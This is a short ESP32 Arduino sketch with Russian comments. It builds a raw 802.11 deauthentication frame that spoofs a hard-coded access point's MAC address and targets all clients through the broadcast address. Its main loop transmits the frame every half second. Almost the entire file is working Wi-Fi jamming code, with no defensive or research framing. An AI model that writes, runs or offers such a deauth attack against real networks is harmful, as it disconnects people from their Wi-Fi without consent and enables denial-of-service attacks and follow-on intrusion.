#include "WiFi.h"
#include "esp_wifi.h"


uint8_t ap_mac[6] = {0x74, 0xfe, 0xce, 0xab, 0x41, 0x6f};


uint8_t client_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// 802.11 Deauthentication Frame
uint8_t deauth_frame[] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
    0x74, 0xfe, 0xce, 0xab, 0x41, 0x6f, // Source MAC
    0x74, 0xfe, 0xce, 0xab, 0x41, 0x6f, // BSSID
    0x00, 0x00, 0x07, 0x00
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);

  // Копируем MAC-адреса в пакет
  memcpy(&deauth_frame[4], client_mac, 6);
  memcpy(&deauth_frame[10], ap_mac, 6);
  memcpy(&deauth_frame[16], ap_mac, 6);
}

void loop() {
  // Отправка raw-пакета (требует специальных библиотек или патчей)
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  Serial.println("Deauth packet sent!");
  delay(500);
}
